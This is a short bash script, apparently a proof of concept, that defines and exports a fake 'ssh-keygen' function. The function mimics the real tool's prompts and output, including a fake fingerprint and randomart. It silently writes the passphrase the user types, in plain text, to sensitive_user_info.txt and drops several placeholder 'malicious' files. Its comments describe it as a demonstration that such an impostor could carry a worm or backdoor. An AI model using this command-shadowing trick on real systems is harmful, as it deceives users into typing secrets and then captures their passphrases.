#!/bin/bash

# Bash "ssh-keygen" Command Impostor
# Joe Kamibeppu | Dec 1 2016

# function that mimics the OpenSSL tool "ssh-keygen"
ssh-keygen() {
    echo "Generating public/private rsa key pair."
    echo "Enter file in which to save the key (/Users/.ssh/id_rsa): "
    read ssh_key_file
    echo "Enter passphrase (empty for no passphrase): "
    read passphrase_1
    echo "Enter same passphrase again: "
    read passphrase_2
    
    if [ "$passphrase_1" != "$passphrase_2" ]; then
        echo "Passphrases do not match. Try again."
        return
    fi

    echo "Your identification has been saved in id_rsa"
    echo "Your public key has been saved in id_rsa.pub"
    echo "The key fingerprint is:"
    echo "SHA256:sg+bF5kEQ4aON3xX6KNv8hyXm2zHSkNYnwjyGVCiYAA"
    echo "The key's randomart image is:"
    echo "+---[RSA 2048]----+"
    echo "|E.o  o=...       |"
    echo "| . ..ooo. .      |"
    echo "|   +. .+o..      |"
    echo "|  . = .o=* o .   |"
    echo "|   . o.+S+o o    |"
    echo "|      .o+. .     |"
    echo "|      o...=.     |"
    echo "|      .*.+o      |"
    echo "|      o=+.=o     |"
    echo "+----[SHA256]-----+"
    
    # the exported function can create new files and write content to those files
    touch pandoras_box.txt
    echo "You have opened the box... All of the evils of the world hae been released." >> pandoras_box.txt

    touch the_nexus_of_evil.txt
    echo "The contents of this file could easily have been a worm, a virus or a tini backdoor." >> the_nexus_of_evil.txt
    
    touch malicious_virus.txt
    banner "Malicious Content" >> malicious_virus.txt
    
    # user may have used sensitive information such as old passwords for the passphrase
    echo "$passphrase_1" >> sensitive_user_info.txt
    echo "$passphrase_2" >> sensitive_user_info.txt
}

export -f ssh-keygen
